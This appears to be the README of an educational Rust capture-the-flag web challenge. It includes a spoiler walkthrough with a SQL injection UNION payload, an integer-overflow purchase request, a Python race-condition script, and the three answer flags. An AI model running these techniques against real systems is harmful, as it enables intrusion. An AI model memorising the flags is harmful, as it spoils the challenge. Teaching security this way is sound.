# Thư Viện Cổ Antiqua — CTF giáo dục

Một challenge web **3 Act / 3 Flag** viết bằng **Rust** (`axum` + `sqlx` + SQLite), dùng cho môn *An toàn & Bảo mật Thông tin*. Bối cảnh: một "thư viện đấu giá thư tịch cổ". Nhiệm vụ: thu thập đủ **3 flag** dạng `IAW{...}`.

> ⚠️ **Chỉ dùng cho mục đích giáo dục** trong môi trường được phép. Các lỗ hổng ở đây là **cố ý**. Không triển khai ra Internet công khai.

---

## Tổng quan chuỗi

```
Act1 SQLi ─lấy RESERVE_CODE─▶ Act2 overflow ─lấy BIDDER_PASS─▶ Act3 race ─▶ FLAG3
   │                              │
 FLAG1                          FLAG2
```

Ba màn **nối tiếp nhau**: mỗi màn sản ra một **token ẩn** bắt buộc để mở màn sau. Token đi *kèm* flag nhưng **không phải** flag — phải đọc kỹ toàn bộ dữ liệu thu được, không chỉ phần trông giống `IAW{...}`.

> **Mồi nhử (traps):** trong DB rải nhiều chuỗi `IAW{f4k3_fl4g...}` (note của `seeker`/`librarian`, một bid đã đóng). Chỉ `secret_note` của `admin` mới là flag thật.

---

## Luật chơi

- Mục tiêu: tìm đủ **3 flag** `IAW{...}`.
- **Các màn nối tiếp** — thứ thu được ở màn trước là chìa khoá mở màn sau.
- Có nhiều flag **giả** gây nhiễu; tự kiểm chứng đâu là flag thật.
- **Quan sát kỹ phản hồi server** (mã lỗi, nội dung, độ trễ) — manh mối nằm ở *hành vi*, không phải ở gợi ý văn bản.

---

## Yêu cầu

- [Docker](https://docs.docker.com/) + Docker Compose, **hoặc**
- Rust toolchain (chỉ khi build thủ công). ⚠️ **Bắt buộc build `--release`** (Act 2 dựa vào `overflow-checks = false`; build debug sẽ *panic* khi nhân tràn số).

---

## Chạy nhanh

### Docker Compose (khuyên dùng)

```bash
docker compose up --build -d
# App lắng nghe tại http://localhost:5001  (8080 bên trong container)
```

Mỗi container = 1 người chơi/team. DB nằm trên `tmpfs` và được tạo mới mỗi lần khởi động, rootfs read-only, chạy UID 1000.

### Kubernetes

```bash
kubectl apply -f challenge.yaml   # Deployment + Service (ClusterIP :5001 -> 8080)
```

### Tài khoản

| User | Mật khẩu | Ghi chú |
|------|----------|---------|
| `seeker` | `seeker` | tài khoản người chơi công khai |

> Đăng nhập tạo cookie `antiqua_session`. Các thao tác mua/đấu giá thực hiện dưới danh nghĩa `seeker`.

### Reset khi test lặp (chủ yếu cho Act 3)

```bash
curl -X POST http://localhost:5001/admin/reset -H 'x-reset-token: antiqua-reset-7f3a'
```

---

## Bản đồ endpoint

| Method | Path | Vai trò |
|--------|------|---------|
| GET | `/` | Trang chủ + ô tra cứu |
| GET·POST | `/login` | Đăng nhập |
| GET | `/shop` | Kho sách & mua (cần đăng nhập) |
| GET | `/auction` | Phiên đấu giá (cần đăng nhập) |
| GET | `/search?q=` | Tra cứu thư tịch |
| GET | `/catalog` | Danh mục sách (JSON) |
| POST | `/buy` | Mua sách |
| POST | `/bids/ticket` | Lấy vé tham gia settle |
| POST | `/bids/settle` | Kết thúc phiên đấu giá |
| POST | `/admin/reset` | (hạ tầng) reset state — header `x-reset-token` |

---

## Cấu trúc thư mục

```
antiqua-library/
├── Dockerfile            # multi-stage: rust:slim (build --release) -> debian:slim
├── docker-compose.yml    # map 5001:8080, read-only rootfs + tmpfs /tmp/db
├── challenge.yaml        # K8s Deployment + Service
├── entrypoint.sh         # tạo /tmp/db, init DB, exec binary
├── src/                  # mã nguồn backend (Rust)
├── templates/            # giao diện HTML
├── static/               # css/js
└── exploits/             # script giải mẫu tự động (Python, stdlib thuần)
```

---

## Hướng dẫn giải (Walkthrough)

> ⚠️ **SPOILER** — Chỉ dành cho người ra đề / giám khảo. Không phát cho người chơi.

### Act 1 — SQL Injection (`GET /search`)

1. **Phát hiện:** gõ một dấu nháy `'` vào ô tra cứu → server trả **lỗi SQL nguyên văn** ⇒ injectable. (Đây là breadcrumb *hành vi* duy nhất — không còn gợi ý chữ.)
2. **Đếm cột:** `' ORDER BY 3-- ` OK, `' ORDER BY 4-- ` lỗi ⇒ **3 cột**.
3. **UNION rút note admin** (nhắm thẳng `admin` để né fake flag):
   ```
   /search?q=' UNION SELECT id, username, secret_note FROM users WHERE username='admin'-- 
   ```
4. **Kết quả** (cột thứ 3):
   ```
   IAW{l3gacy_s34rch_un10n_1nj3ct10n} ::reserve=AQ-9c4f17-RSV
   ```
   ➜ **FLAG 1** + `RESERVE_CODE = AQ-9c4f17-RSV` (mang sang Act 2).

> **Rabbit hole:** SQLi ở `/login` luôn fail (prepared statement). Đường thật là `/search`.
> **Lưu ý curl:** URL-encode khoảng trắng/`--`, hoặc thêm một space sau `--`.

### Act 2 — Integer Overflow (`POST /buy`)

Sách restricted giá `9999`, ví seeker chỉ `1000` coin → bình thường mua không nổi. Khai thác tràn `u32` (release build): tìm `quantity` sao cho `(9999 × quantity) mod 2³² ≤ 1000`.

| Cách | quantity | cost | Ghi chú |
|------|----------|------|---------|
| A — nhỏ nhất (linear scan) | `6_872_635` | 629 coin ✓ | duyệt vòng lặp |
| B — nghịch đảo modulo | `2_710_824_943` | 1 coin ✓ | `pow(9999, -1, 2**32)` |

**Phải kèm `reserve`** (cổng chuỗi từ Act 1), thiếu/sai → `403 reserve_required`:

```bash
curl -X POST http://localhost:5001/buy \
  -H 'Content-Type: application/json' \
  -H 'Cookie: antiqua_session=seeker' \
  -d '{"quantity":6872635,"reserve":"AQ-9c4f17-RSV"}'
```

Response chứa **FLAG 2** và `bidder_pass: BP-3f8a21-PASS` (mang sang Act 3).

Tính quantity nhanh bằng Python:
```python
MOD, base, balance = 2**32, 9999, 1000
print(pow(base, -1, MOD))                                            # cách B -> 2710824943
print(next(i for i in range(1, 2**24) if 0 < (base*i)%MOD <= balance))  # cách A -> 6872635
```

> **Bẫy:** nếu giả định debug build → tưởng "panic, không khai thác được" → sai. Server chạy `--release`.

### Act 3 — TOCTOU + Nonce dùng-một-lần (`POST /bids/settle`)

Handler settle: `READ status='open'` → ngủ 250ms → `WRITE`. Hai request lọt cùng cửa sổ ⇒ 2 settlement ⇒ FLAG 3. Nhưng:

- Cần `bidder_pass` (từ Act 2), thiếu → `403 not_verified_bidder`.
- Mỗi settle cần một **ticket dùng-một-lần** (`POST /bids/ticket`). Dùng lại cùng ticket → `409 ticket_invalid`.

➜ Phải **xin 2 ticket KHÁC nhau** rồi bắn 2 settle **đồng thời**:

```python
import asyncio, aiohttp
BASE = "http://localhost:5001"
PASS = "BP-3f8a21-PASS"                       # từ Act 2
COOKIE = {"Cookie": "antiqua_session=seeker"}
async def ticket(s):
    async with s.post(f"{BASE}/bids/ticket", json={"bid_id":1,"bidder_pass":PASS}, headers=COOKIE) as r:
        return (await r.json())["ticket"]
async def settle(s, t):
    async with s.post(f"{BASE}/bids/settle",
                      json={"bid_id":1,"who":"seeker","ticket":t,"bidder_pass":PASS}, headers=COOKIE) as r:
        print(await r.text())
async def main():
    async with aiohttp.ClientSession() as s:
        ta, tb = await ticket(s), await ticket(s)          # 2 ticket KHÁC nhau
        await asyncio.gather(settle(s, ta), settle(s, tb)) # đua trong window 250ms
asyncio.run(main())
```

Một trong các response trả `double_settle_detected` + **FLAG 3**.

> **Bẫy:** (a) gửi tuần tự → request 2 thấy `settled` → fail; (b) dùng lại 1 ticket → 409. Phải 2 ticket riêng + đồng thời. Nếu đã settle, `POST /admin/reset` rồi thử lại.

---

## Cách nhanh nhất (script có sẵn)

Toàn bộ đã tự động hoá trong [`exploits/`](exploits/) (Python 3, stdlib thuần, không cần `pip install`), **tự nối token đầu-cuối**:

```bash
cd exploits
python solve_all.py                                       # chạy cả 3 Act, in 3 flag
python solve_act2.py http://localhost:5001                # chạy lẻ — tự gọi Act 1 lấy reserve
ANTIQUA_BIDDER_PASS=BP-3f8a21-PASS python solve_act3.py   # nếu đã có pass
```

---

## 3 Flag

| # | Flag |
|---|------|
| 1 | `IAW{l3gacy_s34rch_un10n_1nj3ct10n}` |
| 2 | `IAW{r3l34s3_0v3rfl0w_fr33_r3str1ct3d_b00k}` |
| 3 | `IAW{t0ct0u_d0ubl3_s3ttl3m3nt_r4c3}` |

> Tài liệu thiết kế chi tiết (kiến trúc, tư duy chống-AI, hardening, checklist nghiệm thu) nằm ở [`SPEC.md`](SPEC.md).
